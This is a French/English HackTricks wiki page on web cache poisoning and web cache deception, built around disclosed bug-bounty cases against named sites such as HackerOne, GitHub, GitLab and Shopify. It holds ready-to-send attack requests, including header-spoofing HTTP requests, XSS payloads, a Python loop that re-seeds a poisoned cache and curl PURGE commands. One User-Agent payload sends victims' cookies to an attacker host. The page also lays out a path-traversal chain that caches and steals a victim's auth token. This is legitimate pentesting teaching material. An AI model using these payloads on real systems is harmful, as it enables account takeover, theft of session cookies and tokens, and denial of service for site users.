# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## La différence

> **What is the difference between web cache poisoning and web cache deception?**
>
> - Dans **web cache poisoning**, l'attaquant provoque que l'application stocke du contenu malveillant dans le cache, et ce contenu est servi depuis le cache aux autres utilisateurs de l'application.
> - Dans **web cache deception**, l'attaquant provoque que l'application stocke du contenu sensible appartenant à un autre utilisateur dans le cache, puis l'attaquant récupère ce contenu depuis le cache.

## Cache Poisoning

Cache poisoning vise à manipuler le cache côté client pour forcer les clients à charger des ressources inattendues, partielles ou sous le contrôle d'un attaquant. L'ampleur de l'impact dépend de la popularité de la page affectée, car la réponse empoisonnée est servie exclusivement aux utilisateurs visitant la page pendant la période de contamination du cache.

L'exécution d'une attaque de cache poisoning implique plusieurs étapes :

1. **Identification of Unkeyed Inputs** : Ce sont des paramètres qui, bien qu'ils ne soient pas requis pour qu'une requête soit mise en cache, peuvent modifier la réponse renvoyée par le serveur. Identifier ces inputs est crucial car ils peuvent être exploités pour manipuler le cache.
2. **Exploitation of the Unkeyed Inputs** : Après avoir identifié les unkeyed inputs, l'étape suivante consiste à déterminer comment abuser de ces paramètres pour modifier la réponse du serveur d'une manière qui profite à l'attaquant.
3. **Ensuring the Poisoned Response is Cached** : L'étape finale est de s'assurer que la réponse manipulée est stockée dans le cache. Ainsi, tout utilisateur accédant à la page affectée pendant que le cache est empoisonné recevra la réponse corrompue.

### Découverte : Vérifier les en-têtes HTTP

Généralement, lorsqu'une réponse a été **stockée dans le cache**, il y aura un **en-tête l'indiquant** ; vous pouvez vérifier quels en-têtes il faut surveiller dans cet article : [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Découverte : Mise en cache des codes d'erreur

Si vous pensez que la réponse est stockée dans un cache, vous pouvez essayer d'**envoyer des requêtes avec un en-tête incorrect**, qui devrait renvoyer un **code de statut 400**. Ensuite, essayez d'accéder normalement à la requête et si la **réponse est un code 400**, vous savez que c'est vulnérable (et vous pourriez même provoquer un DoS).

You can find more options in:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Cependant, notez que **parfois ce type de codes de statut n'est pas mis en cache**, donc ce test peut ne pas être fiable.

### Découverte : Identify and evaluate unkeyed inputs

Vous pouvez utiliser [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) pour **brute-force parameters and headers** qui peuvent **modifier la réponse de la page**. Par exemple, une page peut utiliser l'en-tête `X-Forwarded-For` pour indiquer au client de charger le script depuis là :
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Obtenir une réponse nuisible du serveur back-end

Avec le paramètre/**header** identifié, vérifiez comment il est **assaini** et **où** il **est reflété** ou affecte la réponse depuis le header. Pouvez-vous l'abuser malgré tout (réaliser une XSS ou charger du code JS contrôlé par vous ? effectuer un DoS ?...)

### Mettre la réponse en cache

Une fois que vous avez **identifié** la **page** qui peut être abusée, quel **paramètre**/**header** utiliser et **comment** l'**abuser**, vous devez faire en sorte que la page soit mise en cache. Selon la ressource que vous essayez de faire entrer en cache, cela peut prendre un certain temps ; vous devrez peut-être essayer pendant plusieurs secondes.

Le header **`X-Cache`** dans la réponse peut être très utile car il peut avoir la valeur **`miss`** quand la requête n'a pas été mise en cache et la valeur **`hit`** quand elle l'est.  
Le header **`Cache-Control`** est aussi intéressant pour savoir si une ressource est mise en cache et quand elle sera mise en cache à nouveau : `Cache-Control: public, max-age=1800`

Un autre header intéressant est **`Vary`**. Ce header est souvent utilisé pour **indiquer des headers additionnels** qui sont traités comme **partie de la clé de cache** même s'ils ne sont normalement pas keyés. Donc, si l'attaquant connaît le `User-Agent` de la victime qu'il cible, il peut empoisonner le cache pour les utilisateurs utilisant ce `User-Agent` spécifique.

Un autre header lié au cache est **`Age`**. Il définit le temps en secondes pendant lequel l'objet est resté dans le proxy cache.

Lors de la mise en cache d'une requête, soyez **prudent avec les headers que vous utilisez** car certains d'entre eux pourraient être **utilisés de façon inattendue** comme **keyed** et la **victime devra utiliser ce même header**. Testez toujours un Cache Poisoning avec **différents navigateurs** pour vérifier si cela fonctionne.

### Études de cas fondamentales de cache poisoning

#### HackerOne global redirect via `X-Forwarded-Host`

- L'origin générait des redirections et des URLs canoniques avec `X-Forwarded-Host`, mais la cache key n'utilisait que l'entête `Host`, si bien qu'une seule réponse a empoisonné tous les visiteurs de `/`.
- Poison with:
```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```
- Re-demandez immédiatement `/` sans le spoofed header ; si la redirection persiste vous avez une global host-spoofing primitive qui often upgrades reflected redirects/Open Graph links into stored issues.

#### DoS sur dépôt GitHub via `Content-Type` + `PURGE`

- Le trafic anonyme était indexé uniquement par le chemin, tandis que le backend entrait en état d'erreur lorsqu'il voyait un `Content-Type` inattendu. Cette réponse d'erreur était cacheable pour tout utilisateur non authentifié d'un dépôt.
- GitHub a aussi (par accident) honoré la méthode `PURGE`, permettant à l'attaquant de vider une entrée saine et de forcer les caches à récupérer la variante empoisonnée à la demande :
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```
- Comparez toujours les authenticated vs anonymous cache keys, fuzzez les headers rarement utilisés tels que `Content-Type`, et probez les cache-maintenance verbs exposés pour automatiser le re-poisoning.

#### Shopify cross-host persistence loops

- Les caches multi-layer exigent parfois plusieurs hits identiques avant de valider un nouvel objet. Shopify réutilisait le même cache sur de nombreux localized hosts, donc la persistence avait un impact sur de nombreuses propriétés.
- Utilisez de courtes automation loops pour reseed de façon répétée :
```python
import requests, time
for i in range(100):
requests.get("https://shop.shopify.com/endpoint",
headers={"X-Forwarded-Host": "attacker.com"})
time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```
- Après une réponse `hit`, parcourez d'autres hôtes/assets qui partagent le même espace de noms de cache pour démontrer le rayon d'impact inter-domaines.

#### JS asset redirect → stored XSS chain

- Les programmes privés hébergent souvent du JS partagé comme `/assets/main.js` sur des dizaines de sous-domaines. Si `X-Forwarded-Host` influence la logique de redirection pour ces assets mais n'est pas pris en compte comme clé de cache, la réponse mise en cache devient un `301` vers attacker JS, entraînant du stored XSS partout où l'asset est importé.
```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- Cartographiez quels hôtes réutilisent le même chemin d'asset afin de pouvoir prouver une compromission multi-sous-domaine.

#### GitLab DoS statique via `X-HTTP-Method-Override`

- GitLab servait des bundles statiques depuis Google Cloud Storage, qui respecte `X-HTTP-Method-Override`. En remplaçant `GET` par `HEAD`, on obtenait un `200 OK` cacheable avec `Content-Length: 0`, et le cache en périphérie ignorait la méthode HTTP lors de la génération de la clé.
```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
- Une seule requête a remplacé le bundle JS par un corps vide pour chaque GET, provoquant effectivement un DoSing de l'UI. Testez toujours les overrides de méthode (`X-HTTP-Method-Override`, `X-Method-Override`, etc.) sur les ressources statiques et confirmez si le cache varie selon la méthode.

#### Boucle sur ressource statique HackerOne via `X-Forwarded-Scheme`

- Le middleware Rack de Rails faisait confiance à `X-Forwarded-Scheme` pour décider s'il fallait appliquer HTTPS. Usurper `http` contre `/static/logo.png` a déclenché un 301 mis en cache, donc tous les utilisateurs recevaient ensuite des redirections (ou des boucles) au lieu de la ressource :
```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```
- Combine scheme spoofing avec host spoofing quand c'est possible pour créer des redirects irréversibles pour des ressources hautement visibles.

#### Cloudflare host-header casing mismatch

- Cloudflare normalisait l'en-tête `Host` pour les cache keys mais transmettait la casse brute aux origins. L'envoi de `Host: TaRgEt.CoM` déclenchait un comportement alternatif dans l'origin routing/templating tout en remplissant le canonical lowercase cache bucket.
```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```
- Énumérez les tenants CDN en rejouant des hosts en casse mixte (et d'autres en-têtes normalisés) et comparez la réponse mise en cache à la réponse d'origine pour découvrir des shared-platform cache poisonings.

#### Red Hat Open Graph meta poisoning

- L'injection de `X-Forwarded-Host` dans les balises Open Graph a transformé une injection HTML reflétée en un XSS stocké une fois que le CDN a mis la page en cache. Utilisez un cache buster inoffensif pendant les tests pour éviter de nuire aux utilisateurs en production :
```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```
- Les scrapers des réseaux sociaux consomment les balises Open Graph mises en cache, donc une seule poisoned entry distribue la payload bien au-delà des visiteurs directs.

## Exemples d'exploitation

### Exemple le plus simple

Un en-tête comme `X-Forwarded-For` est renvoyé dans la réponse sans être assaini.\
Vous pouvez envoyer un payload XSS basique et poison the cache afin que toute personne accédant à la page soit XSSed :
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Notez que ceci va empoisonner une requête vers `/en?region=uk` et non vers `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

Dans **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** est expliqué le scénario simple suivant :

- Le CDN mettra en cache tout ce qui se trouve sous `/share/`
- Le CDN NE décodera ni ne normalisera `%2F..%2F`, par conséquent, il peut être utilisé comme **path traversal pour accéder à d'autres emplacements sensibles qui seront mis en cache** comme `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Le serveur web décodera et normalisera `%2F..%2F`, et répondra avec `/api/auth/session`, qui **contient l'auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Les cookies peuvent aussi être réfléchis dans la réponse d'une page. Si vous pouvez en abuser pour provoquer une XSS, par exemple, vous pourriez être en mesure d'exploiter la XSS dans plusieurs clients qui chargent la réponse de cache malveillante.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Notez que si le cookie vulnérable est très utilisé par les utilisateurs, les requêtes régulières vont nettoyer le cache.

### Générer des divergences avec des délimiteurs, normalisation et points <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Voir :


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) how it was possible to steal an OpenAI API key with an URL like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` because anything matching `/share/*` will be cached without Cloudflare normalising the URL, which was done when the request reached the web server.

Ceci est également mieux expliqué dans :


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Parfois, vous devrez **exploit several unkeyed inputs** pour pouvoir abuser d'un cache. Par exemple, vous pouvez trouver un **Open redirect** si vous définissez `X-Forwarded-Host` sur un domaine que vous contrôlez et `X-Forwarded-Scheme` sur `http`. Si le **serveur** redirige toutes les requêtes **HTTP** vers **HTTPS** et utilise l'en-tête `X-Forwarded-Scheme` comme nom de domaine pour la redirection, vous pouvez contrôler où la page est dirigée par la redirection.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Exploitation avec un en-tête `Vary` limité

Si vous constatez que l'en-tête **`X-Host`** est utilisé comme **nom de domaine pour charger une ressource JS**, mais que l'en-tête **`Vary`** dans la réponse indique **`User-Agent`**, vous devez alors trouver un moyen d'exfiltrer le User-Agent de la victime et d'empoisonner le cache en utilisant ce User-Agent :
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Envoyez une requête GET avec la requête dans l'URL et dans le body. Si le web server utilise celle provenant du body mais que le cache server met en cache celle provenant de l'URL, toute personne accédant à cette URL utilisera en fait le paramètre du body. Comme la vuln découverte par James Kettle sur le site Github :
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
Il y a un PortSwigger lab à ce sujet : [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Par exemple, il est possible de séparer **paramètres** dans des serveurs ruby en utilisant le caractère **`;`** au lieu de **`&`**. Cela peut être utilisé pour placer des valeurs de paramètres sans clé à l'intérieur de paramètres avec clé et en abuser.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

En savoir plus sur la façon d'effectuer [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

Le [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) peut être utilisé pour tester automatiquement le web cache poisoning. Il prend en charge de nombreuses techniques et est très personnalisable.

Exemple d'utilisation : `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Ce schéma réel enchaîne un primitif de réflexion basé sur les en-têtes avec le comportement du CDN/WAF pour empoisonner de manière fiable le HTML mis en cache et servi à d'autres utilisateurs :

- Le HTML principal reflétait un en-tête de requête non fiable (par exemple, `User-Agent`) dans un contexte exécutable.
- Le CDN supprimait les en-têtes de cache mais un cache interne/origin existait. Le CDN mettait aussi en cache automatiquement les requêtes se terminant par des extensions statiques (p. ex., `.js`), tandis que le WAF appliquait une inspection de contenu moins stricte aux GETs pour les ressources statiques.
- Des particularités du flux de requêtes permettaient à une requête vers un chemin `.js` d'influencer la clé/variante de cache utilisée pour le HTML principal suivant, permettant un XSS inter-utilisateurs via la réflexion d'en-tête.

Recette pratique (observée sur un CDN/WAF populaire) :

1) Depuis une IP propre (éviter les déclassements basés sur la réputation), définissez un `User-Agent` malveillant via le navigateur ou Burp Proxy Match & Replace.
2) Dans Burp Repeater, préparez un groupe de deux requêtes et utilisez "Send group in parallel" (le mode single-packet fonctionne le mieux) :
- Première requête : effectuez un GET sur un chemin de ressource `.js` sur le même origin tout en envoyant votre `User-Agent` malveillant.
- Immédiatement après : GET de la page principale (`/`).
3) La course de routage CDN/WAF, combinée à l'auto-cache du `.js`, met souvent en cache une variante HTML empoisonnée qui est ensuite servie à d'autres visiteurs partageant les mêmes conditions de clé de cache (p. ex., mêmes dimensions `Vary` comme `User-Agent`).

Exemple de payload d'en-tête (pour exfiltrer des cookies non-HttpOnly) :
```http
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- De nombreux CDN cachent les en-têtes de cache ; le cache poisoning peut n'apparaître que sur des cycles de rafraîchissement de plusieurs heures. Utilisez plusieurs vantage IPs et limitez le débit pour éviter les rate-limit ou les reputation triggers.
- Utiliser une IP provenant du cloud du CDN améliore parfois la cohérence du routage.
- Si un CSP strict est présent, cela fonctionne toujours si la reflection s'exécute dans le contexte HTML principal et que le CSP autorise l'inline execution ou est contourné par le contexte.

Impact:

- Si les cookies de session ne sont pas `HttpOnly`, un zero-click ATO est possible en mass-exfiltrating `document.cookie` depuis tous les utilisateurs qui reçoivent le poisoned HTML.


### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

Un pattern spécifique à Sitecore permet des écritures non authentifiées dans le HtmlCache en abusant des handlers XAML pré-auth et de la reflection d'AjaxScriptManager. Lorsque le handler `Sitecore.Shell.Xaml.WebControl` est atteint, un `xmlcontrol:GlobalHeader` (dérivé de `Sitecore.Web.UI.WebControl`) est disponible et l'appel reflectif suivant est autorisé :
```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
This writes arbitrary HTML under an attacker‑chosen cache key, enabling precise poisoning once cache keys are known.

Pour plus de détails (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Exemples vulnérables

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS a transmis le fragment présent dans l'URL sans l'enlever et a généré la cache key en n'utilisant que le host, path and query (ignorant le fragment). Ainsi la requête `/#/../?r=javascript:alert(1)` a été envoyée au backend comme `/#/../?r=javascript:alert(1)` et la cache key ne contenait pas le payload, seulement host, path and query.

### 403 and Storage Buckets

Cloudflare mettait auparavant en cache les réponses 403. Tenter d'accéder à S3 ou Azure Storage Blobs avec des Authorization headers incorrects renvoyait une réponse 403 qui était mise en cache. Bien que Cloudflare ait cessé de mettre en cache les réponses 403, ce comportement peut encore être présent dans d'autres proxy services.

### Injecting Keyed Parameters

Les caches incluent souvent des GET parameters spécifiques dans la cache key. Par exemple, le Varnish de Fastly mettait en cache le paramètre `size` des requêtes. Cependant, si une version URL-encoded du paramètre (par ex. `siz%65`) était aussi envoyée avec une valeur erronée, la cache key serait construite en utilisant le paramètre correct `size`. Pourtant, le backend traiterait la valeur dans le paramètre encodé. URL-encoding du second paramètre `size` entraînait son omission par le cache mais son utilisation par le backend. Assigner la valeur 0 à ce paramètre aboutissait à une erreur 400 Bad Request cacheable.

### User Agent Rules

Certains développeurs bloquent les requêtes dont les user-agents correspondent à ceux d'outils à fort trafic comme FFUF ou Nuclei pour gérer la charge serveur. Ironiquement, cette approche peut introduire des vulnérabilités telles que cache poisoning et DoS.

### Illegal Header Fields

Le [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) spécifie les caractères acceptables dans les header names. Les headers contenant des caractères en dehors de la plage **tchar** devraient idéalement déclencher une réponse 400 Bad Request. En pratique, les serveurs n'adhèrent pas toujours à cette norme. Un exemple notable est Akamai, qui forwarde des headers avec des caractères invalides et met en cache toute erreur 400, tant que le header `cache-control` n'est pas présent. Un pattern exploitable a été identifié où l'envoi d'un header avec un caractère illégal, comme `\`, entraînait une erreur 400 Bad Request cacheable.

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

Notez d'abord que les **extensions** telles que `.css`, `.js`, `.png` etc. sont généralement **configurées** pour être **sauvegardées** dans le **cache**. Donc, si vous accédez à `www.example.com/profile.php/nonexistent.js` le cache stockera probablement la réponse car il voit l'**extension** `.js`. Mais si l'**application** renvoie le contenu utilisateur **sensible** stocké dans _www.example.com/profile.php_, vous pouvez **voler** ces contenus d'autres utilisateurs.

Other things to test:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Dans l'exemple, il est expliqué que si vous chargez une page inexistante comme _http://www.example.com/home.php/non-existent.css_ le contenu de _http://www.example.com/home.php_ (**avec les informations sensibles de l'utilisateur**) sera renvoyé et le cache server va sauvegarder le résultat.\
Ensuite, l'**attacker** peut accéder à _http://www.example.com/home.php/non-existent.css_ dans son propre navigateur et observer les **informations confidentielles** des utilisateurs qui y ont accédé auparavant.

Notez que le **cache proxy** doit être **configuré** pour **cache** des fichiers **basé** sur l'**extension** du fichier (_.css_) et non pas basé sur le content-type. Dans l'exemple _http://www.example.com/home.php/non-existent.css_ aura un content-type `text/html` au lieu d'un mime type `text/css`.

Apprenez ici comment effectuer[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

### CSPT-assisted authenticated cache poisoning (Account Takeover)

This pattern combines a Client-Side Path Traversal (CSPT) primitive in a Single-Page App (SPA) with extension-based CDN caching to publicly cache sensitive JSON that was originally only available via an authenticated API call.

Idée générale:

- Un endpoint API sensible requiert un custom auth header et est correctement marqué comme non-cacheable par l'origin.
- Ajouter un suffixe ressemblant à un fichier statique (par exemple, .css) fait que le CDN traite le path comme un asset statique et met en cache la réponse, souvent sans varier selon les sensitive headers.
- La SPA contient CSPT : elle concatène un segment de path contrôlé par l'utilisateur dans l'URL de l'API tout en attachant le auth header de la victime (par exemple, X-Auth-Token). En injectant un parcours ../.., le fetch authentifié est redirigé vers la variante de path cacheable (…/v1/token.css), ce qui pousse le CDN à mettre en cache le JSON du token de la victime sous une clé publique.
- N'importe qui peut ensuite faire un GET sur cette même cache key sans authentification et récupérer le token de la victime.

Exemple

- Sensitive endpoint (non-cacheable at origin):
```
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache: Miss from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- Un suffixe à apparence statique rend le CDN mis en cache :
```
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- CSPT dans une SPA ajoute auth header et permet traversal:
```js
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');

const apiUrl = `https://api.example.com/v1/users/info/${userId}`;

fetch(apiUrl, {
method: 'GET',
headers: { 'X-Auth-Token': authToken }
});
```
- Exploit chain:
1. Leurrer la victime vers une URL qui injecte des dot-segments dans le paramètre de chemin du SPA, par ex. :
- [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)
2. The SPA issues an authenticated fetch to:
- [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)
3. Browser normalization resolves it to:
- [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)
4. The CDN treats .css as a static asset and caches the JSON with Cache-Control: public, max-age=...
5. Public retrieval: anyone can then GET https://api.example.com/v1/token.css and obtain the cached token JSON.

Préconditions

- Le SPA effectue un fetch/XHR authentifié vers le même API origin (ou cross-origin avec CORS fonctionnel) et attache des headers sensibles ou des bearer tokens.
- Edge/CDN applique un caching basé sur l'extension pour les chemins semblant statiques (p.ex., *.css, *.js, images) et ne varie pas la clé de cache selon le header sensible.
- L'origin pour le endpoint de base est non-cacheable (correct), mais la variante suffixée par une extension est autorisée ou non bloquée par les règles edge.

Checklist de validation

- Identifier les endpoints dynamiques sensibles et tester des suffixes comme .css, .js, .jpg, .json. Rechercher Cache-Control: public/max-age et X-Cache: Hit (ou équivalent, p.ex. CF-Cache-Status) pendant que le contenu reste du JSON.
- Localiser le code client qui concatène des entrées contrôlées par l'utilisateur dans les chemins API tout en ajoutant des headers d'auth. Injecter des séquences ../ pour rediriger la requête authentifiée vers l'endpoint ciblé.
- Confirmer que le header authentifié est présent sur la requête retargetée (p.ex. via un proxy ou les logs serveur) et que le CDN met en cache la réponse sous le chemin traversé.
- Depuis un contexte vierge (sans auth), requêter le même chemin et confirmer que le JSON secret est servi depuis le cache.

## Outils automatiques

- [**toxicache**](https://github.com/xhzeem/toxicache): Scanner Golang pour trouver des vulnérabilités de web cache poisoning dans une liste d'URLs et tester plusieurs techniques d'injection.

## Références

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Cache Poisoning Case Studies Part 1: Foundational Attacks Behind a $100K+ Vulnerability Class](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)



{{#include ../../banners/hacktricks-training.md}}
